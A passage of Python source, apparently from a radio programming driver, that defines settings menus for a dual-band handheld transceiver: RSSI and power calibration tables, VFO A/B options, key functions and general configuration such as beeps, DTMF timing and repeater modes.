                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vfob_rssi_uhf.s13, 1))
        grp.append(rs)
        rs = RadioSetting("vfob_rssi_uhf.s14", "RSSI Rng14 (Band start + Spacing * 13)",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vfob_rssi_uhf.s14, 1))
        grp.append(rs)
        rs = RadioSetting("vfob_rssi_uhf.s15", "RSSI Rng15 (Band start + Spacing * 14)",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vfob_rssi_uhf.s15, 1))
        grp.append(rs)
        rs = RadioSetting("vfob_rssi_uhf.s16", "RSSI >=Rng16 (Band start + Spacing * 15)",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vfob_rssi_uhf.s16, 1))
        grp.append(rs)
        
    def _createVfoBVhfUnkAdjSettings(self, grp):
        rs = RadioSetting("vfob_vhf_unk_adj.s1", "<= Rng1",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vfob_vhf_unk_adj.s1, 1))
        grp.append(rs)
        rs = RadioSetting("vfob_vhf_unk_adj.s2", "Rng2",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vfob_vhf_unk_adj.s2, 1))
        grp.append(rs)
        rs = RadioSetting("vfob_vhf_unk_adj.s3", "Rng3",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vfob_vhf_unk_adj.s3, 1))
        grp.append(rs)
        rs = RadioSetting("vfob_vhf_unk_adj.s4", "Rng4",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vfob_vhf_unk_adj.s4, 1))
        grp.append(rs)
        rs = RadioSetting("vfob_vhf_unk_adj.s5", "Rng5",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vfob_vhf_unk_adj.s5, 1))
        grp.append(rs)
        rs = RadioSetting("vfob_vhf_unk_adj.s6", "Rng6",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vfob_vhf_unk_adj.s6, 1))
        grp.append(rs)
        rs = RadioSetting("vfob_vhf_unk_adj.s7", "Rng7",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vfob_vhf_unk_adj.s7, 1))
        grp.append(rs)
        rs = RadioSetting("vfob_vhf_unk_adj.s8", "Rng8",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vfob_vhf_unk_adj.s8, 1))
        grp.append(rs)
        rs = RadioSetting("vfob_vhf_unk_adj.s9", "Rng9",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vfob_vhf_unk_adj.s9, 1))
        grp.append(rs)
        rs = RadioSetting("vfob_vhf_unk_adj.s10", "Rng10",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vfob_vhf_unk_adj.s10, 1))
        grp.append(rs)
        rs = RadioSetting("vfob_vhf_unk_adj.s11", "Rng11",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vfob_vhf_unk_adj.s11, 1))
        grp.append(rs)
        rs = RadioSetting("vfob_vhf_unk_adj.s12", "Rng12",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vfob_vhf_unk_adj.s12, 1))
        grp.append(rs)
        rs = RadioSetting("vfob_vhf_unk_adj.s13", "Rng13",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vfob_vhf_unk_adj.s13, 1))
        grp.append(rs)
        rs = RadioSetting("vfob_vhf_unk_adj.s14", "Rng14",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vfob_vhf_unk_adj.s14, 1))
        grp.append(rs)
        rs = RadioSetting("vfob_vhf_unk_adj.s15", "Rng15",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vfob_vhf_unk_adj.s15, 1))
        grp.append(rs)
        rs = RadioSetting("vfob_vhf_unk_adj.s16", ">= Rng16",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vfob_vhf_unk_adj.s16, 1))
        grp.append(rs)

    def _createVfoBUhfUnkAdjSettings(self, grp):
        rs = RadioSetting("vfob_uhf_unk_adj.s1", "<= Rng1",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vfob_uhf_unk_adj.s1, 1))
        grp.append(rs)
        rs = RadioSetting("vfob_uhf_unk_adj.s2", "Rng2",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vfob_uhf_unk_adj.s2, 1))
        grp.append(rs)
        rs = RadioSetting("vfob_uhf_unk_adj.s3", "Rng3",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vfob_uhf_unk_adj.s3, 1))
        grp.append(rs)
        rs = RadioSetting("vfob_uhf_unk_adj.s4", "Rng4",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vfob_uhf_unk_adj.s4, 1))
        grp.append(rs)
        rs = RadioSetting("vfob_uhf_unk_adj.s5", "Rng5",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vfob_uhf_unk_adj.s5, 1))
        grp.append(rs)
        rs = RadioSetting("vfob_uhf_unk_adj.s6", "Rng6",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vfob_uhf_unk_adj.s6, 1))
        grp.append(rs)
        rs = RadioSetting("vfob_uhf_unk_adj.s7", "Rng7",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vfob_uhf_unk_adj.s7, 1))
        grp.append(rs)
        rs = RadioSetting("vfob_uhf_unk_adj.s8", "Rng8",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vfob_uhf_unk_adj.s8, 1))
        grp.append(rs)
        rs = RadioSetting("vfob_uhf_unk_adj.s9", "Rng9",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vfob_uhf_unk_adj.s9, 1))
        grp.append(rs)
        rs = RadioSetting("vfob_uhf_unk_adj.s10", "Rng10",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vfob_uhf_unk_adj.s10, 1))
        grp.append(rs)
        rs = RadioSetting("vfob_uhf_unk_adj.s11", "Rng11",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vfob_uhf_unk_adj.s11, 1))
        grp.append(rs)
        rs = RadioSetting("vfob_uhf_unk_adj.s12", "Rng12",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vfob_uhf_unk_adj.s12, 1))
        grp.append(rs)
        rs = RadioSetting("vfob_uhf_unk_adj.s13", "Rng13",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vfob_uhf_unk_adj.s13, 1))
        grp.append(rs)
        rs = RadioSetting("vfob_uhf_unk_adj.s14", "Rng14",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vfob_uhf_unk_adj.s14, 1))
        grp.append(rs)
        rs = RadioSetting("vfob_uhf_unk_adj.s15", "Rng15",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vfob_uhf_unk_adj.s15, 1))
        grp.append(rs)
        rs = RadioSetting("vfob_uhf_unk_adj.s16", ">= Rng16",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vfob_uhf_unk_adj.s16, 1))
        grp.append(rs)

    def _createConfigSettings(self, _settings, cfg_grp):
        rs = RadioSetting("main_ab", "Selected band",
                          RadioSettingValueList(BAND_LIST,
                                                current_index=_settings.
                                                main_ab))
        cfg_grp.append(rs)
        rs = RadioSetting("channel_menu", "Menu available in channel mode",
                          RadioSettingValueBoolean(_settings.channel_menu))
        cfg_grp.append(rs)
        rs = RadioSetting("voice", "Voice Guide",
                          RadioSettingValueBoolean(_settings.voice))
        cfg_grp.append(rs)
        rs = RadioSetting("language", "Language",
                          RadioSettingValueList(LANGUAGE_LIST,
                                                current_index=_settings.
                                                language))
        cfg_grp.append(rs)
        rs = RadioSetting("timeout", "Timeout Timer",
                          RadioSettingValueList(TIMEOUT_LIST,
                                                current_index=_settings.timeout))
        cfg_grp.append(rs)
        rs = RadioSetting("toalarm", "Timeout Alarm",
                          RadioSettingValueInteger(0, 10, _settings.toalarm))
        cfg_grp.append(rs)
        rs = RadioSetting("roger_beep", "Roger Beep",
                          RadioSettingValueBoolean(_settings.roger_beep))
        cfg_grp.append(rs)
        rs = RadioSetting("power_save", "Power save",
                          RadioSettingValueBoolean(_settings.power_save))
        cfg_grp.append(rs)
        rs = RadioSetting("autolock", "Autolock",
                          RadioSettingValueBoolean(_settings.autolock))
        cfg_grp.append(rs)
        rs = RadioSetting("keylock", "Keypad Lock",
                          RadioSettingValueBoolean(_settings.keylock))
        cfg_grp.append(rs)
        rs = RadioSetting("beep", "Keypad Beep",
                          RadioSettingValueBoolean(_settings.beep))
        cfg_grp.append(rs)
        rs = RadioSetting("stopwatch", "Stopwatch",
                          RadioSettingValueBoolean(_settings.stopwatch))
        cfg_grp.append(rs)
        rs = RadioSetting("backlight", "Backlight Time",
                          RadioSettingValueList(BACKLIGHT_LIST,
                                                current_index=_settings.
                                                backlight))
        cfg_grp.append(rs)
        rs = RadioSetting("backlight_level", "Backlight Level",
                          RadioSettingValueInteger(
                              1, 10, _settings.backlight_level, 1))
        cfg_grp.append(rs)
        rs = RadioSetting("dtmf_st", "DTMF Sidetone",
                          RadioSettingValueList(DTMFST_LIST,
                                                current_index=_settings.
                                                dtmf_st))
        cfg_grp.append(rs)
        rs = RadioSetting("ani_sw", "ANI-ID Switch",
                          RadioSettingValueBoolean(_settings.ani_sw))
        cfg_grp.append(rs)
        rs = RadioSetting(
            "ptt_delay", "PTT-ID Delay",
            RadioSettingValueList(
                PTTID_DELAY_LIST, current=str(int(_settings.ptt_delay) * 100)))
        cfg_grp.append(rs)
        rs = RadioSetting(
            "ptt_id", "PTT-ID",
            RadioSettingValueList(
                PTTID_LIST, current_index=_settings.ptt_id))
        cfg_grp.append(rs)
        rs = RadioSetting(
            "ring_time", "Ring Time",
            RadioSettingValueList(
                LIST_10, current_index=_settings.ring_time))
        cfg_grp.append(rs)
        rs = RadioSetting("scan_rev", "Scan Mode",
                          RadioSettingValueList(SCANMODE_LIST,
                                                current_index=_settings.
                                                scan_rev))
        cfg_grp.append(rs)
        rs = RadioSetting("vox", "VOX",
                          RadioSettingValueList(LIST_10,
                                                current_index=_settings.vox))
        cfg_grp.append(rs)
        rs = RadioSetting("prich_sw", "Priority Channel Switch",
                          RadioSettingValueBoolean(_settings.prich_sw))
        cfg_grp.append(rs)
        rs = RadioSetting("pri_ch", "Priority Channel",
                          RadioSettingValueInteger(1, 999, _settings.pri_ch))
        cfg_grp.append(rs)
        rs = RadioSetting("rpt_mode", "Radio Mode",
                          RadioSettingValueList(RPTMODE_LIST,
                                                current_index=_settings.
                                                rpt_mode))
        cfg_grp.append(rs)
        rs = RadioSetting("rpt_set", "Repeater Setting",
                          RadioSettingValueList(RPTSET_LIST,
                                                current_index=_settings.
                                                rpt_set - 1))
        cfg_grp.append(rs)
        rs = RadioSetting("rpt_spk", "Repeater Mode Speaker",
                          RadioSettingValueBoolean(_settings.rpt_spk))
        cfg_grp.append(rs)
        rs = RadioSetting("rpt_ptt", "Repeater PTT",
                          RadioSettingValueBoolean(_settings.rpt_ptt))
        cfg_grp.append(rs)
        rs = RadioSetting("dtmf_tx_time", "DTMF Tx Duration",
                          RadioSettingValueList(DTMF_TIMES,
                                                current=str(_settings.
                                                            dtmf_tx_time * 10)))
        cfg_grp.append(rs)
        rs = RadioSetting("dtmf_interval", "DTMF Interval",
                          RadioSettingValueList(DTMF_TIMES,
                                                current=str(_settings.
                                                            dtmf_interval * 10)))
        cfg_grp.append(rs)
        rs = RadioSetting("alert", "Alert Tone",
                          RadioSettingValueList(ALERTS_LIST,
                                                current_index=_settings.alert))
        cfg_grp.append(rs)
        rs = RadioSetting("rpt_tone", "Repeater Tone",
                          RadioSettingValueBoolean(_settings.rpt_tone == False))
        cfg_grp.append(rs)
        rs = RadioSetting("rpt_hold", "Repeater Hold Time",
                          RadioSettingValueList(HOLD_TIMES,
                                                current_index=_settings.
                                                rpt_hold))
        cfg_grp.append(rs)
        rs = RadioSetting("scan_det", "Scan DET",
                          RadioSettingValueBoolean(_settings.scan_det))
        cfg_grp.append(rs)
        rs = RadioSetting("sc_qt", "SC-QT",
                          RadioSettingValueList(SCQT_LIST,
                                                current_index=_settings.sc_qt))
        cfg_grp.append(rs)
        rs = RadioSetting("smuteset", "SubFreq Mute",
                          RadioSettingValueList(SMUTESET_LIST,
                                                current_index=_settings.
                                                smuteset))
        cfg_grp.append(rs)
        rs = RadioSetting("speaker", "Speaker",
                          RadioSettingValueList(
                              SPK_LIST, current_index=_settings.speaker))
        cfg_grp.append(rs)
        rs = RadioSetting("a_area_mute", "Area A mute",
                          RadioSettingValueBoolean(_settings.a_area_mute))
        cfg_grp.append(rs)
        rs = RadioSetting("b_area_mute", "Area B mute",
                          RadioSettingValueBoolean(_settings.b_area_mute))
        cfg_grp.append(rs)
        _pwd = "".join(map(chr, _settings.mode_sw_pwd))
        val = RadioSettingValueString(0, 6, _pwd)
        val.set_mutable(True)
        rs = RadioSetting("mode_sw_pwd", "Mode Switch Password", val)
        cfg_grp.append(rs)
        _pwd = "".join(map(chr, _settings.reset_pwd))
        val = RadioSettingValueString(0, 6, _pwd)
        val.set_mutable(True)
        rs = RadioSetting("reset_pwd", "Reset Password", val)
        cfg_grp.append(rs)

    def _createVfoASettings(self, _settings, _vfoa, vfoa_grp):
        rs = RadioSetting("workmode_a", "VFO A Workmode",
                          RadioSettingValueList(WORKMODE_LIST,
                                                current_index=_settings.
                                                workmode_a))
        vfoa_grp.append(rs)
        rs = RadioSetting("work_cha", "VFO A Channel",
                          RadioSettingValueInteger(1, 999, _settings.work_cha))
        vfoa_grp.append(rs)
        rs = RadioSetting("vfoa.rxfreq", "VFO A Rx Frequency",
                          RadioSettingValueInteger(
                              134000000, 580000000, _vfoa.rxfreq * 10, 5000))
        vfoa_grp.append(rs)
        rs = RadioSetting("vfoa.txoffset", "VFO A Tx Offset",
                          RadioSettingValueInteger(
                              0, 320000000, _vfoa.txoffset, 5000))
        vfoa_grp.append(rs)
        rs = RadioSetting("vfoa.shift_dir", "VFO A Offset Direction",
                          RadioSettingValueList(
                              OFFSET_LIST, current_index=_vfoa.shift_dir))
        vfoa_grp.append(rs)
        # rs = RadioSetting("vfoa.rxtone", "VFO A Rx Tone",
        #                  RadioSettingValueMap(TONE_MAP, _vfoa.rxtone))
        # vfoa_grp.append(rs)
        # rs = RadioSetting("vfoa.txtone", "VFO A Tx Tone",
        #                  RadioSettingValueMap(TONE_MAP, _vfoa.txtone))
        # vfoa_grp.append(rs)
        rs = RadioSetting("vfoa.power", "VFO A Power",
                          RadioSettingValueList(
                              POWER_LIST, current_index=_vfoa.power))
        vfoa_grp.append(rs)
        rs = RadioSetting("vfoa.iswide", "VFO A NBFM",
                          RadioSettingValueList(
                              BANDWIDTH_LIST, current_index=_vfoa.iswide))
        vfoa_grp.append(rs)
        rs = RadioSetting("vfoa.mute_mode", "VFO A Mute",
                          RadioSettingValueList(
                              SPMUTE_LIST, current_index=_vfoa.mute_mode))
        vfoa_grp.append(rs)
        rs = RadioSetting("vfoa.step", "VFO A Step (kHz)",
                          RadioSettingValueList(
                              STEP_LIST, current_index=_vfoa.step))
        vfoa_grp.append(rs)
        rs = RadioSetting("vfoa.squelch", "VFO A Squelch",
                          RadioSettingValueList(
                              LIST_10, current_index=_vfoa.squelch))
        vfoa_grp.append(rs)
        rs = RadioSetting("bcl_a", "Busy Channel Lock-out A",
                          RadioSettingValueBoolean(_settings.bcl_a))
        vfoa_grp.append(rs)

    def _createVfoBSettings(self, _settings, _vfob, vfob_grp):
        rs = RadioSetting("workmode_b", "VFO B Workmode",
                          RadioSettingValueList(
                              WORKMODE_LIST,
                              current_index=_settings.workmode_b))
        vfob_grp.append(rs)
        rs = RadioSetting("work_chb", "VFO B Channel",
                          RadioSettingValueInteger(1, 999, _settings.work_chb))
        vfob_grp.append(rs)
        rs = RadioSetting("vfob.rxfreq", "VFO B Rx Frequency",
                          RadioSettingValueInteger(
                              134000000, 580000000, _vfob.rxfreq * 10, 5000))
        vfob_grp.append(rs)
        rs = RadioSetting("vfob.txoffset", "VFO B Tx Offset",
                          RadioSettingValueInteger(
                              0, 320000000, _vfob.txoffset, 5000))
        vfob_grp.append(rs)
        rs = RadioSetting("vfob.shift_dir", "VFO B Offset Direction",
                          RadioSettingValueList(
                              OFFSET_LIST, current_index=_vfob.shift_dir))
        vfob_grp.append(rs)
        # rs = RadioSetting("vfob_rxtone", "VFO B Rx Tone",
        #                  RadioSettingValueMap(TONE_MAP, _vfob.rxtone))
        # vfob_grp.append(rs)
        # rs = RadioSetting("vfob_txtone", "VFO B Tx Tone",
        #                  RadioSettingValueMap(TONE_MAP, _vfob.txtone))
        # vfob_grp.append(rs)
        rs = RadioSetting("vfob.power", "VFO B Power",
                          RadioSettingValueList(
                              POWER_LIST, current_index=_vfob.power))
        vfob_grp.append(rs)
        rs = RadioSetting("vfob.iswide", "VFO B NBFM",
                          RadioSettingValueList(
                              BANDWIDTH_LIST, current_index=_vfob.iswide))
        vfob_grp.append(rs)
        rs = RadioSetting("vfob.mute_mode", "VFO B Mute",
                          RadioSettingValueList(
                              SPMUTE_LIST, current_index=_vfob.mute_mode))
        vfob_grp.append(rs)
        rs = RadioSetting("vfob.step", "VFO B Step (kHz)",
                          RadioSettingValueList(
                              STEP_LIST, current_index=_vfob.step))
        vfob_grp.append(rs)
        rs = RadioSetting("vfob.squelch", "VFO B Squelch",
                          RadioSettingValueList(
                              LIST_10, current_index=_vfob.squelch))
        vfob_grp.append(rs)
        rs = RadioSetting("bcl_b", "Busy Channel Lock-out B",
                          RadioSettingValueBoolean(_settings.bcl_b))
        vfob_grp.append(rs)

    def _createKeySettings(self, _settings, key_grp):
        _msg = str(_settings.dispstr).strip().split("\0")[0]
        val = RadioSettingValueString(0, 10, _msg)
        val.set_mutable(True)
        rs = RadioSetting("dispstr", "Display Message", val)
        key_grp.append(rs)
        _ani = ""
        for i in _settings.ani:
            if i < 10:
                _ani += chr(i + 0x30)
            else:
                break
        val = RadioSettingValueString(0, 6, _ani)
        val.set_mutable(True)
        rs = RadioSetting("ani", "ANI code", val)
        key_grp.append(rs)
        rs = RadioSetting("pf2_func", "PF2 Key function",
                          RadioSettingValueList(
                              PF2KEY_LIST,
                              current_index=self._memobj.settings.pf2_func))
        key_grp.append(rs)
        rs = RadioSetting("pf1_func", "PF1 Key function",
                          RadioSettingValueList(
                              PF1KEY_LIST,
                              current_index=self._memobj.settings.pf1_func))
        key_grp.append(rs)

    def _createVhfPowerSettings(self, vpwr_grp):
        rs = RadioSetting("vhf_pwr_band.freq_start", "Frequency band start",
                          RadioSettingValueInteger(
                              130000000, 185000000,
                              self._memobj.vhf_pwr_band.freq_start * 10, 100000))
        vpwr_grp.append(rs)
        rs = RadioSetting("vhf_pwr_band.spacing", "Band spacing in Mhz",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vhf_pwr_band.spacing, 1))
        vpwr_grp.append(rs)
        rs = RadioSetting("vhf_high_pwr.s1", "High <= Rng1 (Band start)",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vhf_high_pwr.s1, 1))
        vpwr_grp.append(rs)
        rs = RadioSetting("vhf_high_pwr.s2", "High Rng2 (Band start + Spacing)",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vhf_high_pwr.s2, 1))
        vpwr_grp.append(rs)
        rs = RadioSetting("vhf_high_pwr.s3", "High Rng3 (Band start + Spacing * 2)",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vhf_high_pwr.s3, 1))
        vpwr_grp.append(rs)
        rs = RadioSetting("vhf_high_pwr.s4", "High Rng4 (Band start + Spacing * 3)",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vhf_high_pwr.s4, 1))
        vpwr_grp.append(rs)
        rs = RadioSetting("vhf_high_pwr.s5", "High Rng5 (Band start + Spacing * 4)",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vhf_high_pwr.s5, 1))
        vpwr_grp.append(rs)
        rs = RadioSetting("vhf_high_pwr.s6", "High Rng6 (Band start + Spacing * 5)",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vhf_high_pwr.s6, 1))
        vpwr_grp.append(rs)
        rs = RadioSetting("vhf_high_pwr.s7", "High Rng7 (Band start + Spacing * 6)",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vhf_high_pwr.s7, 1))
        vpwr_grp.append(rs)
        rs = RadioSetting("vhf_high_pwr.s8", "High Rng8 (Band start + Spacing * 7)",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vhf_high_pwr.s8, 1))
        vpwr_grp.append(rs)
        rs = RadioSetting("vhf_high_pwr.s9", "High Rng9 (Band start + Spacing * 8)",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vhf_high_pwr.s9, 1))
        vpwr_grp.append(rs)
        rs = RadioSetting("vhf_high_pwr.s10", "High Rng10 (Band start + Spacing * 9)",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vhf_high_pwr.s10, 1))
        vpwr_grp.append(rs)
        rs = RadioSetting("vhf_high_pwr.s11", "High Rng11 (Band start + Spacing * 10)",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vhf_high_pwr.s11, 1))
        vpwr_grp.append(rs)
        rs = RadioSetting("vhf_high_pwr.s12", "High Rng12 (Band start + Spacing * 11)",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vhf_high_pwr.s12, 1))
        vpwr_grp.append(rs)
        rs = RadioSetting("vhf_high_pwr.s13", "High Rng13 (Band start + Spacing * 12)",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vhf_high_pwr.s13, 1))
        vpwr_grp.append(rs)
        rs = RadioSetting("vhf_high_pwr.s14", "High Rng14 (Band start + Spacing * 13)",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vhf_high_pwr.s14, 1))
        vpwr_grp.append(rs)
        rs = RadioSetting("vhf_high_pwr.s15", "High Rng15 (Band start + Spacing * 14)",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vhf_high_pwr.s15, 1))
        vpwr_grp.append(rs)
        rs = RadioSetting("vhf_high_pwr.s16", "High >= Rng16 (Band start + Spacing * 15)",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vhf_high_pwr.s16, 1))
        vpwr_grp.append(rs)
        rs = RadioSetting("vhf_low_pwr.s1", "Low <= Rng1 (Band start)",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vhf_low_pwr.s1, 1))
        vpwr_grp.append(rs)
        rs = RadioSetting("vhf_low_pwr.s2", "Low Rng2 (Band start + Spacing)",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vhf_low_pwr.s2, 1))
        vpwr_grp.append(rs)
        rs = RadioSetting("vhf_low_pwr.s3", "Low Rng3 (Band start + Spacing * 2)",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vhf_low_pwr.s3, 1))
        vpwr_grp.append(rs)
        rs = RadioSetting("vhf_low_pwr.s4", "Low Rng4 (Band start + Spacing * 3)",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vhf_low_pwr.s4, 1))
        vpwr_grp.append(rs)
        rs = RadioSetting("vhf_low_pwr.s5", "Low Rng5 (Band start + Spacing * 4)",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vhf_low_pwr.s5, 1))
        vpwr_grp.append(rs)
        rs = RadioSetting("vhf_low_pwr.s6", "Low Rng6 (Band start + Spacing * 5)",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vhf_low_pwr.s6, 1))
        vpwr_grp.append(rs)
        rs = RadioSetting("vhf_low_pwr.s7", "Low Rng7 (Band start + Spacing * 6)",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vhf_low_pwr.s7, 1))
        vpwr_grp.append(rs)
        rs = RadioSetting("vhf_low_pwr.s8", "Low Rng8 (Band start + Spacing * 7)",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vhf_low_pwr.s8, 1))
        vpwr_grp.append(rs)
        rs = RadioSetting("vhf_low_pwr.s9", "Low Rng9 (Band start + Spacing * 8)",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vhf_low_pwr.s9, 1))
        vpwr_grp.append(rs)
        rs = RadioSetting("vhf_low_pwr.s10", "Low Rng10 (Band start + Spacing * 9)",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vhf_low_pwr.s10, 1))
        vpwr_grp.append(rs)
        rs = RadioSetting("vhf_low_pwr.s11", "Low Rng11 (Band start + Spacing * 10)",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vhf_low_pwr.s11, 1))
        vpwr_grp.append(rs)
        rs = RadioSetting("vhf_low_pwr.s12", "Low Rng12 (Band start + Spacing * 11)",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vhf_low_pwr.s12, 1))
        vpwr_grp.append(rs)
        rs = RadioSetting("vhf_low_pwr.s13", "Low Rng13 (Band start + Spacing * 12)",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vhf_low_pwr.s13, 1))
        vpwr_grp.append(rs)
        rs = RadioSetting("vhf_low_pwr.s14", "Low Rng14 (Band start + Spacing * 13)",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vhf_low_pwr.s14, 1))
        vpwr_grp.append(rs)
        rs = RadioSetting("vhf_low_pwr.s15", "Low Rng15 (Band start + Spacing * 14)",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vhf_low_pwr.s15, 1))
        vpwr_grp.append(rs)
        rs = RadioSetting("vhf_low_pwr.s16", "Low >= Rng16 (Band start + Spacing * 15)",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.vhf_low_pwr.s16, 1))
        vpwr_grp.append(rs)

    def _createUhfPowerSettings(self, upwr_grp):
        rs = RadioSetting("uhf_pwr_band.freq_start", "Frequency band start",
                          RadioSettingValueInteger(
                              230000000, 580000000,
                              self._memobj.uhf_pwr_band.freq_start * 10, 100000))
        upwr_grp.append(rs)
        rs = RadioSetting("uhf_pwr_band.spacing", "Band spacing in Mhz",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.uhf_pwr_band.spacing, 1))
        upwr_grp.append(rs)
        rs = RadioSetting("uhf_high_pwr.s1", "High <= Rng1 (Band start)",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.uhf_high_pwr.s1, 1))
        upwr_grp.append(rs)
        rs = RadioSetting("uhf_high_pwr.s2", "High Rng2 (Band start + Spacing)",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.uhf_high_pwr.s2, 1))
        upwr_grp.append(rs)
        rs = RadioSetting("uhf_high_pwr.s3", "High Rng3 (Band start + Spacing * 2)",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.uhf_high_pwr.s3, 1))
        upwr_grp.append(rs)
        rs = RadioSetting("uhf_high_pwr.s4", "High Rng4 (Band start + Spacing * 3)",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.uhf_high_pwr.s4, 1))
        upwr_grp.append(rs)
        rs = RadioSetting("uhf_high_pwr.s5", "High Rng5 (Band start + Spacing * 4)",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.uhf_high_pwr.s5, 1))
        upwr_grp.append(rs)
        rs = RadioSetting("uhf_high_pwr.s6", "High Rng6 (Band start + Spacing * 5)",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.uhf_high_pwr.s6, 1))
        upwr_grp.append(rs)
        rs = RadioSetting("uhf_high_pwr.s7", "High Rng7 (Band start + Spacing * 6)",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.uhf_high_pwr.s7, 1))
        upwr_grp.append(rs)
        rs = RadioSetting("uhf_high_pwr.s8", "High Rng8 (Band start + Spacing * 7)",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.uhf_high_pwr.s8, 1))
        upwr_grp.append(rs)
        rs = RadioSetting("uhf_high_pwr.s9", "High Rng9 (Band start + Spacing * 8)",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.uhf_high_pwr.s9, 1))
        upwr_grp.append(rs)
        rs = RadioSetting("uhf_high_pwr.s10", "High Rng10 (Band start + Spacing * 9)",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.uhf_high_pwr.s10, 1))
        upwr_grp.append(rs)
        rs = RadioSetting("uhf_high_pwr.s11", "High Rng11 (Band start + Spacing * 10)",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.uhf_high_pwr.s11, 1))
        upwr_grp.append(rs)
        rs = RadioSetting("uhf_high_pwr.s12", "High Rng12 (Band start + Spacing * 11)",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.uhf_high_pwr.s12, 1))
        upwr_grp.append(rs)
        rs = RadioSetting("uhf_high_pwr.s13", "High Rng13 (Band start + Spacing * 12)",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.uhf_high_pwr.s13, 1))
        upwr_grp.append(rs)
        rs = RadioSetting("uhf_high_pwr.s14", "High Rng14 (Band start + Spacing * 13)",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.uhf_high_pwr.s14, 1))
        upwr_grp.append(rs)
        rs = RadioSetting("uhf_high_pwr.s15", "High Rng15 (Band start + Spacing * 14)",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.uhf_high_pwr.s15, 1))
        upwr_grp.append(rs)
        rs = RadioSetting("uhf_high_pwr.s16", "High >= Rng16 (Band start + Spacing * 15)",
                          RadioSettingValueInteger(
                              0, 255,
                              self._memobj.uhf_high_pwr.s16, 1))
        upwr_grp.append(rs)
